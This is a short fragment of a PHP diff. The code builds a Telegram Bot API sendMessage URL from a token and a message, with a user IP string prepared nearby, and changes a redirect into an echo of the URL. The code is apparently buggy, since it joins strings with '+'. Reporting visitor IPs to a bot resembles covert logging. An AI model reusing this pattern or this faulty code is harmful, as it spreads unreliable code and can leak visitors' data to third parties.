@@ -16,5 +16,5 @@ $res = "IP : $user_ip";
       'text' => 'fv'
   ];
   $url = "https://api.telegram.org/bot$apiToken/sendMessage?" + http_build_query($data);
-header("Location: $url");
+echo $url;
 }
